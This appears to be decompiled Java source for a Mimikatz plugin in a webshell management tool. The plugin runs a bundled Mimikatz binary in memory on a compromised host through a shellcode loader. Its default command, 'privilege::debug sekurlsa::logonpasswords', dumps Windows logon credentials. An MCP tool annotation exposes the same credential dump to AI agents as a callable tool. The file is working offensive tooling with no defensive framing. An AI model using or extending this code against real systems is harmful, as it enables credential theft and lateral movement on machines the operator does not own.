//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import core.EasyI18N;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import core.annotation.McpTool;
import core.annotation.McpParam;

public abstract class Mimikatz implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel argsLabel = new JLabel("args");
    private final JTextField argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
    private final JButton runButton = new JButton("Run");
    private final JSplitPane splitPane = new JSplitPane();
    private final RTextArea resultTextArea = new RTextArea();
    protected ShellEntity shellEntity;
    protected Payload payload;
    private Encoding encoding;
    private ShellcodeLoader loader;

    public Mimikatz() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.argsLabel);
        topPanel.add(this.argsTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Mimikatz.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        EasyI18N.installObject(this);
    }

    protected abstract ShellcodeLoader getShellcodeLoader();

    protected ShellcodeLoader createLoader() {
        return null;
    }

    private byte[] readMimikatzPe() {
        String name = PayloadArch.mimikatzAssetName(this.payload);
        InputStream in = Mimikatz.class.getResourceAsStream("assets/" + name);
        if (in == null) {
            return null;
        }
        return functions.readInputStreamAutoClose(in);
    }

    private ShellcodeLoader ensureLoader() {
        if (this.loader != null) {
            return this.loader;
        }
        try {
            if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
                this.loader = this.getShellcodeLoader();
            }
        } catch (Throwable ignored) {
        }
        if (this.loader == null) {
            this.loader = this.createLoader();
        }
        return this.loader;
    }

    private void runButtonClick(ActionEvent actionEvent) {
        this.loader = this.ensureLoader();
        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "loader not found");
            return;
        }
        try {
            byte[] pe = this.readMimikatzPe();
            if (pe == null || pe.length == 0) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "missing " + PayloadArch.mimikatzAssetName(this.payload));
                return;
            }
            byte[] result = this.loader.runPe2(this.argsTextField.getText().trim(), pe, 6000);
            this.resultTextArea.setText(this.encoding.Decoding(result));
        } catch (Exception var4) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
        }
    }

    @McpTool(name = "run", desc = "Run Mimikatz via runPe2 (same as UI). Default: privilege::debug sekurlsa::logonpasswords exit", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "command", defaultValue = "privilege::debug sekurlsa::logonpasswords exit", desc = "mimikatz args") })
    public String mcpRun(Map<String, Object> args) {
        String cmd = String.valueOf(args.getOrDefault("command", "privilege::debug sekurlsa::logonpasswords exit"));
        try {
            ShellcodeLoader ldr = this.ensureLoader();
            if (ldr == null) {
                return "loader not found";
            }
            byte[] pe = this.readMimikatzPe();
            if (pe == null || pe.length == 0) {
                return "missing " + PayloadArch.mimikatzAssetName(this.payload);
            }
            byte[] result = ldr.runPe2(cmd, pe, 6000);
            return this.encoding != null ? this.encoding.Decoding(result) : new String(result);
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            return "failed:\n" + sw.toString();
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
